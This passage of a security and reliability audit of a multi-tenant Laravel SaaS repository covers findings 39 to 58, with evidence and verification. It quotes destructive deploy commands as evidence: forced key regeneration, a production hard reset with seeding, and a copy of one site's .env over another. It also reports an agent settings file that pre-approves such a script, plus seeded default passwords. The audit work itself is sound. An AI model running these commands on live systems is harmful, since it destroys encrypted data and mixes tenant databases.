- **No transaction and no provisioning state.** `TenantProvisionerService::provision()` (lines 55-132) runs Tenant::create, then the domains, Subscription::create, then `$tenant->run(...)` seeding. `ProvisionTenantAction` (line 17) and `SuperAdminApiController::storeTenant` (lines 93-110) add no transaction or rollback. The controller only logs the error and returns 422, so the tenant and domain rows written before the failure stay in the database.
- **No status check on resolution.** `ResolveApiTenancy.php:33-37` and `:57-68` call `tenancy()->initialize()` without checking the tenant's status. The only status check I found is in `ResolveTenantWorkspaceAction.php:48`, and it only checks for suspended. A half-provisioned tenant therefore still resolves and its requests will fail.

**Where the claim is overstated or slightly wrong:**
1. **Retry error.** Retrying the same slug gives a 422 validation error from `StoreTenantRequest` (`unique:tenants,slug`), not a duplicate primary key error. The outcome is the same: the operator cannot retry without cleaning up by hand.
2. **The code comment's rationale is wrong.** The vendor job `CreateDatabase` calls `ensureTenantCanBeCreated()` before `createDatabase()`. That check throws `TenantDatabaseAlreadyExistsException` if the database already exists (`vendor/stancl/tenancy/src/Database/DatabaseManager.php:97-98`). So the "pre-created in hPanel" case the comment describes would fail before the catch is reached. In practice the catch only hides real errors such as missing privileges, and those surface later as a confusing MigrateDatabase connection error. This supports the finding.
3. **Scope.** Only the super-admin can trigger provisioning, and the leftovers can be cleaned up by hand. The worst effects are a broken tenant row and customer data left behind when a DROP DATABASE fails silently. There is no cross-tenant data exposure or money corruption.

I did not check the deploy script's TENANT_DB_PREFIX, the hosting privileges, or the request timeout. Those parts of the claim are plausible but not verified.

### 39. [MEDIUM] DeleteTenantAction and UpdateTenantDatabaseConfigAction are committed with PHP parse errors (variables stripped)
- **Location:** `backend/app/Actions/Tenants/DeleteTenantAction.php:12`
- **Effort:** S
- **Evidence:** The file contains `public function execute(Tenant ): void { DB::transaction(function () use () { ->domains()->delete(); ->delete(); }); }`. `php -l` reports 'Parse error: syntax error, unexpected token ")"'. UpdateTenantDatabaseConfigAction.php:11 has the same corruption ('unexpected token ","'). It is committed as-is (HEAD, commit 606da74b 'ensure ... clean UTF-8 without BOM'). The likely cause is that a PowerShell double-quoted here-string ate the `$` variables.
- **Impact:** DELETE /super-admin/tenants/{id} and POST /tenants/{id}/update-db-config fatal with ParseError during method injection, before the try block, so they return an uncaught 500. Super-admins cannot fix a tenant's DB credentials, which is the documented Hostinger fallback. Any optimized classmap or static analysis step also chokes. Even once fixed, delete hard-drops the tenant DB synchronously, with no soft-delete, grace period or final backup.
- **Recommendation:** Restore both files with proper variables. Add `php -l`/Pint/PHPStan to CI. Change tenant deletion to soft-delete plus status=deleted, with a delayed queued purge after a final backup. Add Feature tests hitting both endpoints.
- **Verification:** Confirmed from the code. In HEAD and the clean working tree, backend/app/Actions/Tenants/DeleteTenantAction.php:12 reads `public function execute(Tenant ): void`, with `use ()` and the receivers missing from `->domains()->delete(); ->delete();`. backend/app/Actions/Tenants/UpdateTenantDatabaseConfigAction.php:11 reads `execute(Tenant , array ): Tenant`, and every `$` variable in its body is gone. Running local `php -l` (PHP 8.4.12) gives `unexpected token ")", expecting variable` on line 12 for the first file and `unexpected token ","` on line 11 for the second. Commit 606da74b ('fix(actions): ensure DeleteTenantAction has clean UTF-8 without BOM') last touched both files. Both classes are type-hinted for method injection in backend/app/Http/Controllers/Api/SuperAdminApiController.php:247 (destroyTenant) and :268 (updateDatabaseConfig). They are routed at backend/routes/api.php:201-202 (DELETE /tenants/{id} and POST /tenants/{id}/update-db-config, super-admin group). Autoloading the class during container resolution throws a ParseError before the controller's try/catch(Throwable) runs. So both endpoints always fail with an uncaught 500, as claimed. The 'no grace period' claim is also accurate: TenancyServiceProvider:39-44 runs Jobs\DeleteDatabase synchronously on TenantDeleted (shouldBeQueued(false)). I lowered it from high to medium because the blast radius is limited to two super-admin-only endpoints, and they fail safe: nothing gets deleted or corrupted, and no tenant-facing flow or security boundary is affected. The 'optimized classmap chokes' claim is overstated, since composer's classmap scan does not fully parse files. The bug is still real committed breakage that needs a fix plus a test, along with soft-delete or a backup before the DB drop.

### 40. [MEDIUM] Mobile and desktop update checks compare the wrong version numbers (endless or impossible updates, fake install)
- **Location:** `backend/resources/js/Composables/useAppUpdate.js:52`
- **Effort:** M
- **Evidence:** On Android the client reports CapacitorApp.getInfo().build, which is versionCode 3 (backend/android/app/build.gradle:10-11, versionName 1.0.2). The app_versions android row is version_code 110 (publish_windows_version.py), so 3 < 110 and the update prompt never stops. On desktop, lines 52-60 replace the Electron version with the web bundle's version.json build_number (135), so the installed EXE version is never compared. Raising the windows version_code above 135 then prompts every desktop, again after each install, until the web bundle is bumped. On Android, startDownloadAndInstall (lines 164-230) goes to the 'fallback' path: a Math.random progress bar, localStorage.setItem('sroor_app_version_code', ...) (write-only, never read back), then location.reload(). It never downloads or installs the APK, although the manifest requests REQUEST_INSTALL_PACKAGES.
- **Impact:** With is_force_update or min_version_code > 3, every Android user hits a force-update modal they cannot clear, and the fake install loops. The super-admin 'releases' screen gives a false sense that updates are being delivered. Desktop users either never get native fixes or are prompted repeatedly.
- **Recommendation:** Use one version source. Inject versionName/versionCode into Gradle and package.json from CI, report the native shell version (Capacitor getInfo, app.getVersion()) without the web bundle overwriting it, and send the web build number as a separate field. On Android, really download the file and open the installer (an intent via a plugin), or send users to Play Store / an in-app update. Remove the simulated progress.
- **Verification:** The finding holds up in the code, but the claimed impact is overstated. Evidence:
(1) Android. useAppUpdate.js:42-45 sets currentVersionCode from CapacitorApp.getInfo().build. The APK's build is versionCode 3 (backend/android/app/build.gradle:10). publish_windows_version.py:41-44 seeds the android row with version_code 110. CheckAppUpdateAction.php:27 computes has_update = 110 > 3, so it is always true.
(2) The Android "install" is fake. The fallback at useAppUpdate.js:201-241 runs a Math.random progress timer. It writes localStorage 'sroor_app_version_code', which nothing ever reads, then calls location.reload(). It never fetches download_url or installs the APK. capacitor.config.json loads the remote server URL, so after the reload getInfo() still reports 3 and the modal comes back.
(3) Dismissal does not stick across sessions. closeModal saves app_update_dismissed_code=110, but line 96 compares that key with currentVersionCode (3), so the user is prompted again every session.
(4) Desktop. Lines 56-58 overwrite the code with the web bundle's build_number (135 in version.json), so the Electron version is never used in the comparison. Today the windows row (110) is below 135, so desktop users are never offered the native EXE update. Desktop does have a real updater bridge (desktop/preload.js:39 updater.downloadAndInstall), so the fake-install part applies only to Android.
Why medium, not high: the "force-update modal they cannot clear" only happens if is_force_update is set or min_version_code is above 3. The seeded rows have is_force_update=false and min_version_code=1. The actual effect is a recurring, dismissible nag on Android, a fake update that never delivers a new APK, and desktop native updates never offered. There is no data loss and no security or integrity impact.

### 41. [MEDIUM] The Android shell is hardwired to one tenant (2m), so the APK cannot be sold as a generic SaaS client
- **Location:** `backend/capacitor.config.json:7`
- **Effort:** M
- **Evidence:** capacitor.config.json sets server.url to https://2m.baraa-solutions.com with cleartext: true and appId com.sroor.cofe.erp, and appName contains 'سرور كوفي'. strings.xml repeats the coffee name and package. Desktop falls back to https://2m.baraa-solutions.com in main.js:195, 349, 481 and 540, and useAppUpdate.js:190 falls back to the 2m .exe download.
- **Impact:** Every APK opens one specific tenant, so onboarding a new tenant needs a rebuild or a different binary. Coffee and tenant branding ship to all customers. A tenant-specific fallback URL can send another tenant's terminal to 2m's login or update files (wrong-tenant UX, and in the EXE case it trusts 2m's server).
- **Recommendation:** Point the shell at the central workspace connect page (as desktop does with /connect) or bundle the SPA locally with a tenant picker. Remove every '2m' fallback. Rename appId/package to a neutral id (it must stay stable after the first Play release, so decide before publishing). Set cleartext=false.
- **Verification:** The Android part of the finding is real; the desktop part is overstated.

Confirmed for Android:
- backend/capacitor.config.json:1-9 sets appId to com.sroor.cofe.erp, uses the coffee app name, and sets server.url to https://2m.baraa-solutions.com with cleartext:true.
- The same 2m URL is baked into backend/android/app/src/main/assets/capacitor.config.json:7.
- strings.xml:3-6 repeats the coffee name and package.

The in-app workspace connect flow does not rescue mobile:
- WorkspaceConnectView.vue:81-91 never navigates away on native/mobile. It only stores localStorage and pushes the router, so the WebView stays on the 2m host.
- api.js:33 sends an X-Tenant header, and ResolveApiTenancy.php:30-38 starts that tenant. But the middleware does not return after step 2, so step 3 (lines 46-69) re-resolves by host and calls tenancy()->initialize() again with the 2m tenant.
- So every API call from the APK ends up in 2m's tenant database whatever workspace the user picked. In practice the APK is locked to 2m, and another tenant's users get logins that fail or hit the wrong database.

Overstated for desktop:
- desktop/main.js:39-84 has a generic tenant flow: deep link sroor://connect?tenant=..., a saved tenantId/serverUrl, and otherwise https://baraa-solutions.com/connect.
- The 2m fallbacks at main.js:195, 349, 481 and 540 apply only before a workspace is connected (POS menu items, the ping, a missing downloadUrl). useAppUpdate.js:190 applies only when the server sends no download_url. These are hygiene/branding leaks in edge cases, not a hardwired client.

I lowered the severity from high to medium. This blocks shipping one generic mobile APK and leaks coffee/2m branding, but it is not a data-exposure bug. The fix is configuration: a central server.url (or a bundled webDir), a generic appId and name, and returning after X-Tenant initialization in ResolveApiTenancy.

### 42. [MEDIUM] No release signing for the APK or the Windows installer; only debug builds exist
- **Location:** `backend/android/app/build.gradle:19`
- **Effort:** M
- **Evidence:** build.gradle has no signingConfigs, and the release buildType sets only minifyEnabled false. build-apk.bat runs gradlew assembleDebug, and the only output found is app/build/outputs/apk/debug/app-debug.apk. No keystore or keystore.properties exists anywhere. desktop/package.json has no win signing (certificateFile/CSC_*) and no publish config. An 87MB backend/public/sroor-cofe-erp-2m.apk and backend/public/app.apk sit in the web root (untracked), while the DB row claims 19.4MB.
- **Impact:** A debug-signed APK cannot go to Play, and its signing key is a per-machine debug key, so a rebuild on another machine cannot install over an existing install. Unsigned EXEs trigger SmartScreen warnings, and with the updater above nothing proves where a binary came from.
- **Recommendation:** Create a release keystore kept in GitHub Secrets (base64) and add signingConfigs.release that reads it from env vars. Build assembleRelease/bundleRelease in CI. Buy an OV/EV code-signing certificate for electron-builder. Store sha256 in app_versions and verify it on the client. Serve binaries from GitHub Releases or object storage, not public/.
- **Verification:** I checked the code and the finding is accurate. I lowered the severity from high to medium.

What the code shows:
- **Android build:** backend/android/app/build.gradle:19-24 has no `signingConfigs` block. The `release` buildType sets only `minifyEnabled false` and the proguard files.
- **Build script:** backend/build-apk.bat runs `gradlew.bat assembleDebug`. The only build output is backend/android/app/build/outputs/apk/debug/app-debug.apk.
- **Keystores and certificates:** none exist in the repo outside node_modules and vendor (searched for *.jks, *.keystore, keystore.properties, *.pfx and *.p12). No gradle or properties file mentions signing.
- **Desktop installer:** desktop/package.json `build.win` has nsis and portable targets but no `certificateFile`, `certificateSubjectName` or `publish` settings. No script anywhere sets CSC_LINK or calls assembleRelease.
- **APKs in the web root:** backend/public/app.apk and backend/public/sroor-cofe-erp-2m.apk are each 87,293,471 bytes. Git ignores them through .gitignore:75 `*.apk`. They are still live download targets: DownloadLatestApkAction.php:34 serves them through the public routes `/api/v1/app/download-apk` and `/app/download-latest-apk` (routes/api.php:25-26).

What I did not confirm: I did not check the claim that the database row says 19.4MB. The string appears only inside binary sqlite files.

Why medium and not high:
- This is a gap in how releases are built, not a vulnerability someone can exploit right away. Integrity still depends on HTTPS for the download.
- The app is sideloaded through its own download endpoint, not Play, so the "cannot go to Play" point does not block anything today.
- The real risks are these:
  - If the APK is rebuilt on another machine, its debug key changes and the update will not install over the existing app. Users would have to uninstall and lose local data.
  - The Windows installer is unsigned, so SmartScreen shows warnings.
  - Nothing proves where a binary came from, which matters for an app that updates itself.
- These are serious problems for a sellable SaaS, but they are not a high-severity vulnerability.

### 43. [MEDIUM] Root .gitignore patterns with a slash are anchored to the repo root, so the backend/ app is mostly unprotected
- **Location:** `.gitignore:20`
- **Effort:** S
- **Evidence:** Patterns such as public/build/ (l.20), public/hot (l.22), database/*.sqlite (l.36), e2e/screenshots/ (l.92) and e2e/.auth/ (l.95) contain a slash, so git anchors them to the root. `git check-ignore --no-index` confirms backend/public/build/manifest.json, backend/e2e/screenshots/*.png, backend/tests/e2e/reports/index.html, after_submit.png, __pycache__/*.pyc and backups/*.sql are NOT ignored. backend/.gitignore does not exist. Tracked as a result: 95 backend/public/build files (about 319MB of blobs across history, most of the 337MiB pack), 161 backend/e2e/screenshots files (~34MB), 20 backend/tests/e2e/reports files, backend/e2e/.auth/user.json (Playwright session state: auth_token, laravel-session and auth_user for local 127.0.0.1/localhost, pushed to origin), and backend/public/hot.
- **Impact:** Clones are 340MB and growing with every rebuild. Every release adds hashed bundles. Test session tokens and user data are published.
- **Recommendation:** Add a backend/.gitignore (the Laravel default) or use explicit /backend/... patterns (proposal below). Untrack these paths and consider git filter-repo to drop backend/public/build and the screenshots from history.
- **Verification:** The finding is real, but it overstates both the size and the security impact.

**Confirmed in the code and the repo:**
- The root .gitignore uses patterns with a slash in the middle: public/build/ at l.20, public/hot at l.22, database/*.sqlite at l.36, e2e/screenshots/ at l.92 and e2e/.auth/ at l.95. Git anchors these to the repo root.
- backend/.gitignore does not exist.
- `git check-ignore -v --no-index` exits with rc=1 for backend/public/build/manifest.json, backend/e2e/screenshots/x.png, backend/public/hot, backend/e2e/.auth/user.json and backend/tests/e2e/reports/index.html. None of them is ignored.
- `git ls-files` shows these are tracked: 95 files under backend/public/build, 161 under backend/e2e/screenshots, 20 under backend/tests/e2e/reports, plus backend/e2e/.auth/user.json and backend/public/hot.
- user.json is a Playwright storageState file. It holds XSRF-TOKEN and laravel-session cookies for 127.0.0.1, and localStorage auth_token and auth_user for 127.0.0.1:8000 and localhost:8000. It came in with commit db2e4eca, which is on origin/feature/multi-tenant and origin/feature/api-migration.

**Overstated:**
- **Size:** backend/public/build blobs across history are 319 MiB uncompressed, but only about 61 MiB on disk after delta compression. That is not "most of the 337MiB pack".
- **Credentials:** the leaked tokens are local dev-server sessions (127.0.0.1/localhost). They only matter if the same token and user data are valid on a shared or production DB.
- **Build files may be committed on purpose:** deploy_root_baraa.py:153 copies `$BACKEND_DIR/public/build/*` to the server's public dir, so the Hostinger deploy may depend on the committed build.

**Still unintended:** the screenshots, the e2e reports, user.json and public/hot.

**Severity:** real repo-hygiene problem with a minor data leak, so medium rather than high.

### 44. [MEDIUM] deploy.sh runs `artisan key:generate --force` on every deploy (cross-area note)
- **Location:** `deploy.sh:30`
- **Effort:** S
- **Evidence:** deploy.sh:30 runs `$PHP84 artisan key:generate --force || true` unconditionally after the .env copy, followed by `migrate --force --seed || true` (central only) after a `git reset --hard origin/main`.
- **Impact:** If this script is still used, each deploy rotates APP_KEY. Every session is invalidated and every encrypted cast/Crypt value (tenant DB passwords, if stored encrypted) becomes unreadable.
- **Recommendation:** Generate the key only when APP_KEY is empty. Remove `|| true`. Hand this to the deploy sub-area lead.
- **Verification:** The code behaves as described. deploy.sh:31 (not :30) runs `$PHP84 artisan key:generate --force || true` with no check on whether APP_KEY is already set. `.env` is only copied from .env.example when it is missing (lines 23-25), so on every run after the first the existing key is overwritten: with --force, Laravel's KeyGenerateCommand skips the confirmation prompt and replaces the current APP_KEY. Line 32 then runs `migrate --force --seed || true` after `git reset --hard origin/main` (line 14). origin/main has artisan at the repo root, so the script would run.

The finding overstates how much this matters:
1. deploy.sh is not the active deploy path. .github/workflows/deploy.yml (lines 46-49), on main too, deploys by calling update_webhook.php. That file (update_webhook.php:32-37 and backend/public/update_webhook.php) only does git fetch/reset, `migrate --force` and `optimize:clear`. It never runs key:generate.
2. deploy.sh has not changed since 2026-08-08 (commits 615e19c3 and 7d422558). It is a legacy manual script.
3. The impact is narrower than claimed. Sanctum bearer tokens are stored as SHA-256 hashes and do not depend on APP_KEY, so API logins in this token-based SPA survive. What breaks is sessions and encrypted cookies, plus any `encrypted` casts or Crypt values. I did not confirm that tenant DB passwords are stored encrypted.

The risk is still real. .claude/settings.json:30-31 pre-allows `Bash(./deploy.sh*)` and `bash deploy.sh*`, so an agent could run it without a permission prompt. The same unconditional `key:generate --force` also appears in several root scripts: deploy_hostinger_php84.py:47, deploy_sroor.py:59, deploy_subdomain.py:50, finish_subdomain.py:42, deploy_remote.py:48, deploy_to_sroor_subdomain.py:87, deploy_with_mysql.py:78, deploy_hostinger_php83.py:46 and fix_shipping_php83.py:62.

Because this is a real hazard in a legacy script that is not part of the active pipeline, I rate it medium rather than high.

### 45. [MEDIUM] sync_sroor.py copies one production site, including its .env, over another
- **Location:** `D:/projects/sroor/sync_sroor.py:15`
- **Effort:** S
- **Evidence:** Lines 14-15 run `cp -r .../shipping.baraa-solutions.com/public_html/* ...` and `cp -r .../shipping.../public_html/.[!.]* .../baraa-solutions.com/public_html/sroor/`, where the dotfile glob includes .env and .git.
- **Impact:** The sroor install picks up the shipping site's DB credentials and APP_KEY, so the two sites can end up writing to each other's database (cross-installation data mixing) and sessions become invalid.
- **Recommendation:** Delete sync_sroor.py. Each installation must keep its own .env, never copied from another.

### 46. [MEDIUM] Junk and stale artifacts are tracked in git: root storage/ compiled views, .pyc, screenshots, .env.e2e; .gitignore has gaps
- **Location:** `D:/projects/sroor/.gitignore`
- **Effort:** S
- **Evidence:** Tracked: about 70 compiled Blade views under the ROOT storage/framework/views/*.php (pre-backend layout leftovers), __pycache__/bump_version.cpython-312.pyc, after_submit.png, and .env.e2e (contains an APP_KEY, though a test key with sqlite DB_DATABASE=database/e2e_testing.sqlite). test_val.php is tracked even though .gitignore has `test_*.php`. backups/ and *.sql are not ignored. Correctly ignored: *.apk (the 87 MB sroor-cofe-erp-2m.apk), /test-results/, /desktop/dist/ and /desktop/*.log, all confirmed with git check-ignore.
- **Impact:** Repo bloat, confusing duplicate storage trees, and the next dump or secret file dropped in backups/ gets committed automatically by `git add .`.
- **Recommendation:** Run git rm --cached on storage/, __pycache__/, *.png at the root and test_val.php. Add backups/, *.sql*, __pycache__/, /storage/ and /*.png to .gitignore. Generate the .env.e2e key in CI instead of committing it.

### 47. [MEDIUM] The built frontend is committed even though .gitignore excludes it, and stale root build output is tracked
- **Location:** `D:/projects/sroor/backend/public/build`
- **Effort:** S
- **Evidence:** The .gitignore pattern `public/build/` should exclude backend/public/build, yet 95 files under it are tracked; deploy_root_baraa.py builds locally (line 26) and commits with `git add .`. The repo root also tracks leftovers from before the monorepo move: bootstrap/cache/packages.php, bootstrap/cache/services.php, about 60 compiled storage/framework/views/*.php files, __pycache__/bump_version.cpython-312.pyc, and several *.png screenshots. The legacy deploy.sh:57-64 writes a .htaccess that serves any existing file directly from a repo-root docroot.
- **Impact:** Production assets depend on what happened to be on one developer's machine (node version, uncommitted changes). Builds can't be reproduced, and Vite-hash churn in every PR makes code review noisy. Running the legacy layout would expose repo files (.env, sqlite files, logs) through the web server.
- **Recommendation:** Untrack backend/public/build (`git rm --cached`) and build in CI as part of the release artifact. Remove the tracked root bootstrap/cache and storage/framework/views files. Delete deploy.sh and its .htaccess rewriting.

### 48. [MEDIUM] About 15 overlapping deploy scripts target different branches, paths and PHP versions
- **Location:** `D:/projects/sroor/deploy_root_baraa.py:71`
- **Effort:** M
- **Evidence:** deploy_root_baraa.py:71-72 checks out and resets to `feature/api-migration`, not main and not feature/multi-tenant. Every other script resets to origin/main (deploy_local_to_server.py:49, deploy_live_safe.py:58, deploy_all_locations.py:34, ...) and runs artisan at the target root, a layout that broke when the app moved to backend/ (e85c1d62). deploy_live_safe.py:36-38 deploys to three sites, including shipping.baraa-solutions.com. deploy.bat:9 runs deploy_local_to_server.py.
- **Impact:** It is unclear which code is in production, and the SaaS branch has no defined path to production. If someone runs a legacy script, it resets live trees to an incompatible layout and may break or overwrite unrelated sites on the same account.
- **Recommendation:** Archive or delete all deploy_*.py, deploy.sh, deploy.bat and update_webhook.php. Replace them with one versioned pipeline (GitHub Actions plus one server-side release script under backend/deploy/ or ops/), driven by tags or a protected release branch.

### 49. [MEDIUM] Queue design breaks under tenancy: DB queue connection is unpinned, and the worker runs via scheduler with QUEUE_CONNECTION=sync in prod
- **Location:** `backend/config/queue.php:40`
- **Effort:** S
- **Evidence:** 'database' queue has `'connection' => env('DB_QUEUE_CONNECTION')` (null, so the default connection, which is the tenant DB once tenancy is initialized). Tenant migrations include 0001_01_01_000002_create_jobs_table.php, so tenant-context dispatches land in the tenant DB's jobs table. routes/console.php:12 runs `queue:work --stop-when-empty` in central context every minute, and it only reads central jobs. deploy_root_baraa.py sets QUEUE_CONNECTION=sync. app/Jobs/* (4 Telegram jobs) are never dispatched anywhere (grep), and Telegram calls happen synchronously inside requests.
- **Impact:** Once any tenant-context job is dispatched on the database driver, it is silently never processed. With sync, slow Telegram/HTTP calls run inline in POS requests, and provisioning cannot be queued. QueueTenancyBootstrapper is enabled but has nothing working to bootstrap.
- **Recommendation:** Set queue.connections.database.connection and failed/batching to the central connection explicitly. Remove `jobs`/`cache` tables from tenant migrations (or keep them deliberately). Use a supervised long-running worker where hosting allows, or keep the scheduler worker but with QUEUE_CONNECTION=database in prod. Dispatch Telegram via jobs afterCommit.

### 50. [MEDIUM] TenantSampleSeeder (run on every deploy via --seed) checks the wrong id and provisions a demo tenant with super-admin phone and default password
- **Location:** `backend/database/seeders/TenantSampleSeeder.php:15`
- **Effort:** S
- **Evidence:** `Tenant::find('tenant_sroor')` guards against re-run, but it then provisions slug 'demo' with phone set to a hardcoded super-admin phone, password 'password', and customDomain 'sroor.localhost'. DatabaseSeeder::run calls it after seeding two super-admins with default passwords. deploy.sh:32 runs `migrate --force --seed || true`.
- **Impact:** First deploy creates a production 'demo' tenant whose admin is a global super-admin (via the Gate::before phone list) with a guessable password. Later deploys always try to re-provision 'demo', fail on duplicate PK, and the failure is masked by `|| true`, which hides real seeding errors.
- **Recommendation:** Split seeders: a production-safe ReferenceDataSeeder (permissions, plans) used in deploy, and Demo* seeders that refuse to run in production. Fix the idempotency check to use the same id. Never seed credentials.

### 51. [MEDIUM] Super-admin can point a new tenant at an arbitrary existing database; provisioning then overwrites an existing user's password
- **Location:** `backend/app/Services/TenantProvisionerService.php:43`
- **Effort:** M
- **Evidence:** tenancy_db_name/username/password from the DTO are accepted as-is (lines 43-53). ensureTenantCanBeCreated() only checks databaseExists() using the central user, which on Hostinger cannot see DBs owned by other MySQL users. Seeding then does `User::where('email',$dto->email)->orWhere('phone', $dto->phone ?: '01000000000')->first()` and updates that user's password and roles (lines 99-124). tenancy_db_password is stored in the tenants.data JSON in plaintext (no encrypted cast seen).
- **Impact:** A typo or reuse of another tenant's DB name and credentials makes two tenants share one database, a cross-tenant leak. It also hijacks an existing admin account by resetting its password. DB credentials for every tenant sit unencrypted in the central DB, which is also the only thing the Telegram backup exports.
- **Recommendation:** Validate that tenancy_db_name is unique across tenants (a central unique index on the stored value). On the pre-created-DB path, refuse non-empty databases (no `migrations` table). Encrypt tenancy_db_password (stancl supports custom DatabaseConfig, or store it encrypted and decrypt in a TenantDatabaseConfig override). In a fresh DB, create the admin unconditionally rather than upserting by email/phone.

### 52. [MEDIUM] Scheduled Telegram alerts and backup are not tenant-aware (central context only, one global chat)
- **Location:** `backend/routes/console.php:25`
- **Effort:** M
- **Evidence:** notify:daily-summary, notify:low-stock, notify:overdue-shifts and backup:telegram (console.php lines 25-38) call TelegramService methods directly. Example: sendDailySummaryNotification queries Invoice::where(...) at TelegramService.php:133 with no $tenant->run() and no Tenant::cursor() loop. Setting (the source of telegram_bot_token and chat_id) is a tenant-only table (database/migrations/tenant/2026_08_10_221000_create_settings_table.php; no central migration), so Setting::get swallows the error and falls back to the global config('services.telegram.*'). Only AppVersion and CentralUser pin a connection.
- **Impact:** No tenant ever gets its shift, low-stock or EOD alerts. Depending on the central DB contents, the commands either throw 'table not found' every run or report legacy single-shop data to the operator's chat. The monitoring advertised to customers does not work in SaaS mode.
- **Recommendation:** Turn each notify command into a dispatcher that loops Tenant::cursor() and runs `$tenant->run(fn () => …)` with per-tenant settings, ideally as queued tenant-aware jobs. Send platform alerts (backup, failures) to an operator channel separate from tenant channels.

### 53. [MEDIUM] Logging writes debug-level output to one unrotated file with no tenant or request context
- **Location:** `backend/config/logging.php:55`
- **Effort:** S
- **Evidence:** The default is 'stack' -> LOG_STACK='single' (logging.php:55-58 → storage/logs/laravel.log). .env.example:19-22 sets LOG_CHANNEL=stack, LOG_STACK=single, LOG_LEVEL=debug. A 'daily' channel exists but is unused. No Log::withContext/shareContext anywhere in app/routes/bootstrap (grep empty), so entries carry no tenant_id, user_id or request id. cron_schedule.sh:3 appends schedule:run output to storage/logs/cron.log forever. The local storage/logs/laravel.log is already 10.8MB.
- **Impact:** On shared hosting the single file grows until it hits disk quota, and then the app and backups fail. Errors from many tenants are mixed together with no way to tell which customer was affected. Debug level in prod may write sensitive data.
- **Recommendation:** Use LOG_STACK=daily (14-30 days) with LOG_LEVEL=warning in prod and a JSON formatter. Add middleware that calls Log::shareContext(['tenant'=>tenant('id'),'user'=>id,'store'=>…,'request_id'=>…]) after tenancy init. Rotate cron.log through logrotate, or write it to the daily channel.

### 54. [MEDIUM] No error tracking, alerting or meaningful health checks
- **Location:** `backend/bootstrap/app.php:31`
- **Effort:** M
- **Evidence:** withExceptions only adds JSON renderers. There is no reporter, and composer.json has no Sentry, Flare, Bugsnag or Nightwatch package. Health is the framework default `health: '/up'` (line 13), which only proves the app boots: no DB, tenant DB, queue, scheduler-heartbeat or disk checks. Backup failures only call Log::error (TelegramService.php:391) and return FAILURE. Nothing alerts on a missed run (no ->onFailure/->pingOnSuccess/heartbeat on the schedule entries). There is no uptime-monitor config in the repo.
- **Impact:** Production errors, failed backups and a dead Hostinger cron go unnoticed until a customer complains. For a paid SaaS, an outage or days of missed backups would be invisible.
- **Recommendation:** Add Sentry (or Nightwatch/Flare) with a tenant_id tag and release version from version.json. Add a /health/deep endpoint (central DB, a sample tenant DB, cache, disk free, last successful backup age, last scheduler tick), protected or with minimal output. Use ->pingOnSuccess()/->onFailure() heartbeats (healthchecks.io or Better Uptime) on schedule:run and the backup command, plus an external uptime check on /up for each central and tenant domain.

### 55. [MEDIUM] No staging environment, and prod is used as the test bed (live test scripts, seeding prod)
- **Location:** `deploy_live_and_seed.py:60`
- **Effort:** L
- **Evidence:** deploy_live_and_seed.py:53-63 runs `git reset --hard origin/main`, `migrate --force`, `db:seed --class=PermissionsSeeder --force` and the full `db:seed --force` on production. DatabaseSeeder creates super-admins with weak default passwords (firstOrCreate) and calls TenantSampleSeeder, which provisions a demo tenant. Root scripts test_live_*.py (auth, pos, permissions, login, browser, touch_pos...), test_all_live.py (which also renames index.html and chmods .htaccess on the server, line 39), check_live_*.py, check_env_live.py (greps the prod .env) and verify_production_users.py (uploads and runs a PHP file on prod, line 46) all target prod domains. No 'staging' appears in tracked files or config. .env.example defaults to APP_ENV=local, APP_DEBUG=true, DB_CONNECTION=sqlite. 91 tracked root scripts contain password literals (SSH/DB password type).
- **Impact:** Tests and verification mutate live customer systems. There is no safe place to rehearse tenant migrations or restores. A misconfigured prod .env copied from .env.example would expose debug pages and full Telescope recording.
- **Recommendation:** Create a staging subdomain on its own central DB plus 2-3 anonymized tenant DBs, refreshed from sanitized backups. Point all live-test scripts at staging via env vars, and later delete them in favor of Playwright suites. Add a .env.production.example (APP_ENV=production, APP_DEBUG=false, LOG_LEVEL=warning, MySQL). Never run db:seed (only idempotent permission seeders) in prod deploys. Purge the secrets and rotate them.

### 56. [MEDIUM] Tenant delete and DB-config actions have committed PHP parse errors; when fixed, tenant delete drops the DB with no final backup
- **Location:** `backend/app/Actions/Tenants/DeleteTenantAction.php:12`
- **Effort:** S
- **Evidence:** `php -l` fails: 'syntax error, unexpected token ")", expecting variable' at DeleteTenantAction.php:12 (`execute(Tenant ): void`, `->domains()->delete();`) and at UpdateTenantDatabaseConfigAction.php:11. All $variables were stripped, consistent with shell interpolation in a generator script (commit 606da74b). These are the only two files in app/config/routes/database/bootstrap that fail lint. TenancyServiceProvider.php:39-44 wires TenantDeleted → Jobs\DeleteDatabase synchronously. SafeMySQLDatabaseManager::deleteDatabase/createDatabase swallow every Throwable and return true.
- **Impact:** Today DELETE /super-admin/tenants/{id} and update-db-config throw a fatal ParseError (500), and nothing caught it, so no lint or test gate exists. Once fixed, a single click would irreversibly DROP a paying tenant's database with no pre-delete snapshot. Silent manager errors also mean a failed CREATE DATABASE on Hostinger looks like success.
- **Recommendation:** Restore the variable names. Add `php -l` / Pint / PHPUnit to CI on backend/. Change tenant deletion to soft-delete or suspend plus a grace period, with a mandatory encrypted final dump before DeleteDatabase. Make the Safe manager log and rethrow unless an explicit 'pre-created DB' flag is set.

### 57. [MEDIUM] Pulse storage connection follows the default connection, so tenant requests probably fail to record
- **Location:** `backend/config/pulse.php:67`
- **Effort:** S
- **Evidence:** 'connection' => env('PULSE_DB_CONNECTION') is null, so Pulse uses the current default connection. During tenant requests the default is the tenant DB, and the pulse_* tables exist only in the central migrations (2026_08_13_220048_create_pulse_tables.php); none are in database/migrations/tenant. By contrast, Telescope pins env('DB_CONNECTION','mysql') (telescope.php:62) and failed_jobs pins DB_CONNECTION (queue.php:125).
- **Impact:** Plausible: Pulse ingest at request end targets the tenant DB and errors or gets dropped. The dashboard then shows only central traffic, hiding exactly the tenant slow queries and exceptions the operator needs, and may write error noise to the logs.
- **Recommendation:** Set PULSE_DB_CONNECTION to the central connection name (e.g. 'mysql') and add a tenant tag via Pulse::user/filter or custom recorders. Verify on staging with a tenant request.

### 58. [MEDIUM] backend/public/hot (http://localhost:5173) is tracked
- **Location:** `backend/public/hot`
- **Effort:** S
- **Evidence:** git ls-files lists backend/public/hot, containing http://localhost:5173. resources/views/app.blade.php:72 uses @vite(...). Laravel switches to dev-server URLs whenever public_path('hot') exists. Last touched in 1b2f71f0.
- **Impact:** Any deploy that checks out backend/ with public/ as the document root (git reset --hard) makes the SPA load JS/CSS from the visitor's localhost:5173, giving a blank page for all tenants. Prod may currently avoid this only because of custom path handling, which I could not verify.
